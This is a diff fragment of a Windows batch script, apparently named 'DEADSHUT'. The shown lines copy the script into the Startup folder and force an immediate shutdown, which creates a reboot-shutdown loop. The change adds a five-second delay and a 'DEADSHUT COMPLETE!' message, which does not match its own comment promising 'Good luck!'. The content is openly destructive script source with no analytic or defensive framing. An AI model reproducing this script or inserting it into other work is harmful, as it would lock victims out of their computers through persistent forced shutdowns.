@@ -12,7 +12,10 @@ rem Copy the script to the Startup folder
 copy "%script_path%%script_name%" "%startup_folder%" > nul
 
 rem Add a delay before shutting down the computer
-timeout /t 0 /nobreak >nul
+timeout /t 5 /nobreak >nul
+
+rem Display the message "Good luck!" before shutting down
+echo DEADSHUT COMPLETE!
 
 rem Shutdown the computer
 shutdown /s /f /t 0
